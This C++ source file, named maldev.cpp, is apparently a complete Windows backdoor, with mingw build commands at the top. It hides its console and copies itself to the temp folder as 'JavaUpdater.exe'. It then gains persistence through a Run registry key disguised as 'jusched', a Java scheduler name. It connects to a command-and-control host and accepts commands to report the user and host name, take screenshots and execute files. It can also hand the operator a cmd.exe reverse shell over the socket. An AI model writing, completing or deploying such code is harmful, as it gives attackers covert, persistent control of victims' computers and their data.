//  i686-w64-mingw32-g++ -std=c++11 maldev.cpp -o maldev.exe -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//  i686-w64-mingw32-g++ -std=c++11 maldev.cpp -o maldev.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <time.h>

// #define AUTORUN_HIVE HKEY_LOCAL_MACHINE
#define AUTORUN_HIVE HKEY_CURRENT_USER
#define AUTORUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define AUTORUN_KEY_NAME "jusched"

#include <stdio.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void exec(char* returnval, int returnsize, char *fileexec) {
    if (32 >= (int)(ShellExecute(NULL,"open", fileexec, NULL, NULL, SW_HIDE))) {
        strcat(returnval, "[x] Error executing command..\n");
    } else {
        strcat(returnval, "\n");
    }
}

void CaptureScreen() {
    unsigned int cx = GetSystemMetrics(SM_CXSCREEN), cy = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreenDC = ::GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, cx, cy);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, cx, cy, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemDC, hOldBitmap);
    ::ReleaseDC(NULL, hScreenDC);
   
    size_t headerSize = sizeof(BITMAPINFOHEADER)+3*sizeof(RGBQUAD);
    BYTE* pHeader = new BYTE[headerSize];
    LPBITMAPINFO pbmi = (LPBITMAPINFO)pHeader;
    memset(pHeader, 0, headerSize);
    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pbmi->bmiHeader.biBitCount = 0;
    if (!GetDIBits(hMemDC, hBitmap, 0, 0, NULL, pbmi, DIB_RGB_COLORS))
        return;
   
    BITMAPFILEHEADER bmf;
    if (pbmi->bmiHeader.biSizeImage <= 0)
        pbmi->bmiHeader.biSizeImage=pbmi->bmiHeader.biWidth*abs(pbmi->bmiHeader.biHeight)*(pbmi->bmiHeader.biBitCount+7)/8;
    BYTE* pData = new BYTE[pbmi->bmiHeader.biSizeImage];
    bmf.bfType = 0x4D42; bmf.bfReserved1 = bmf.bfReserved2 = 0;
    bmf.bfSize = sizeof(BITMAPFILEHEADER)+ headerSize + pbmi->bmiHeader.biSizeImage;
    bmf.bfOffBits = sizeof(BITMAPFILEHEADER) + headerSize;
    if (!GetDIBits(hMemDC, hBitmap, 0, abs(pbmi->bmiHeader.biHeight), pData, pbmi, DIB_RGB_COLORS))
    {
        delete pData;
        return;
    }
    FILE* hFile = fopen("test.bmp", "wb");
    fwrite(&bmf, sizeof(BITMAPFILEHEADER), 1, hFile);
    fwrite(pbmi, headerSize, 1, hFile);
    fwrite(pData, pbmi->bmiHeader.biSizeImage, 1, hFile);
    fclose(hFile);

    DeleteObject(hBitmap);
    DeleteDC(hMemDC);

    delete [] pData;
}

void whoami(char* returnval, int returnsize) {
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize) {
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize) {
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

void Run(char* C2Server, int C2Port) {
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(C2Server);
    addr.sin_port = htons(C2Port);
 
    while (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        srand(time(NULL));
        Sleep(((rand()%30)+10)*1000);
    }

    char CommandReceived[DEFAULT_BUFLEN] = "";
    TCHAR lpTempPathBuffer[MAX_PATH];
    if (GetTempPath(MAX_PATH, lpTempPathBuffer) != 0) {        
        TCHAR szFilepath[ MAX_PATH ];
        GetModuleFileName( NULL, szFilepath, MAX_PATH );

        strcat(lpTempPathBuffer, "JavaUpdater.exe");
        int reg_key;
        HKEY hkey;
        if (CopyFile(szFilepath, lpTempPathBuffer, FALSE)) {    
            reg_key = RegCreateKey(AUTORUN_HIVE, AUTORUN_KEY, &hkey);
            RegSetValueEx((HKEY)hkey, AUTORUN_KEY_NAME, 0, REG_SZ, (BYTE*) lpTempPathBuffer, strlen(lpTempPathBuffer));
        } else {
            reg_key = RegCreateKey(AUTORUN_HIVE, AUTORUN_KEY, &hkey);
            RegSetValueEx((HKEY)hkey, AUTORUN_KEY_NAME, 0, REG_SZ, (BYTE*) szFilepath, strlen(szFilepath));
            // MessageBox( NULL, lpTempPathBuffer, "Error copy", MB_OK|MB_ICONINFORMATION );
        }
    }
    

    while (true) {
        int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
        if ((strcmp(CommandReceived, "whoami\n") == 0)) {
            char buffer[257] = "";
            whoami(buffer,257);
            strcat(buffer, "\n");
            send(tcpsock, buffer, strlen(buffer)+1, 0);
            memset(buffer, 0, sizeof(buffer));
            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
        else if ((strcmp(CommandReceived, "shell\n") == 0)) {
            char Process[] = "c:\\WiNdOWs\\SyStEm32\\cMd.exE";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);

            memset(CommandReceived, 0, sizeof(CommandReceived));
            int RecvCode = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(tcpsock);
                WSACleanup();
                continue;
            }
            if (strcmp(CommandReceived, "exit\n") == 0) {
                exit(0);
            }
        }
        else if ((strcmp(CommandReceived, "hostname\n") == 0)) {
            char buffer[257] = "";
            hostname(buffer,257);
            strcat(buffer, "\n");
            send(tcpsock, buffer, strlen(buffer)+1, 0);
            memset(buffer, 0, sizeof(buffer));
            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
        else if ((strcmp(CommandReceived, "pwd\n") == 0)) {
            char buffer[257] = "";
            pwd(buffer,257);
            strcat(buffer, "\n");
            send(tcpsock, buffer, strlen(buffer)+1, 0);
            memset(buffer, 0, sizeof(buffer));
            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
        else if ((strcmp(CommandReceived, "screenshot\n") == 0)) {
            CaptureScreen();
            char buffer[257] = "Screenshot captured.\n";
            send(tcpsock, buffer, strlen(buffer)+1, 0);
            memset(buffer, 0, sizeof(buffer));
            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
        else if ((strcmp(CommandReceived, "help\n") == 0)) {
            char buffer[257] = "Commands: whoami hostname pwd exit\n";
            send(tcpsock, buffer, strlen(buffer)+1, 0);
            memset(buffer, 0, sizeof(buffer));
            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
        else if ((strcmp(CommandReceived, "exit\n") == 0)) {
            closesocket(tcpsock);
            WSACleanup();
            exit(0);
        }
        else {
            char splitval[DEFAULT_BUFLEN] = "";
            for(int i=0; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
            {
                if (CommandReceived[i] == *" ")    //CommandReceived[i] is a pointer here and can only be compared with a integer, this *" "
                {
                    break;
                }
                else
                {
                    splitval[i] = CommandReceived[i];
                }
            }
            if ((strcmp(splitval, "exec") == 0)) {
                char CommandExec[DEFAULT_BUFLEN] = "";
                int j = 0;
                for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                {
                    CommandExec[j] = CommandReceived[i];
                    ++j;
                }
                char buffer[257] = "";
                exec(buffer, 257, CommandExec);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else {
                char buffer[20] = "Invalid Command\n";
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}


int main(int argc, char **argv) {
    int MAXPATH = 255;
    TCHAR exePath[MAXPATH];
    GetModuleFileName(0, exePath, MAXPATH);

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE); //SW_SHOWNORMAL SW_HIDE
    // ShowWindow(stealth, SW_SHOWNORMAL); //SW_SHOWNORMAL SW_HIDE
    
    if (argc == 3) {
        int port  = atoi(argv[2]); //Converting port in Char datatype to Integer format
        Run(argv[1], port);
    }
    else {
        char host[] = "192.168.0.25";
        int port = 8080;
        Run(host, port);
    }
    return 0;
}
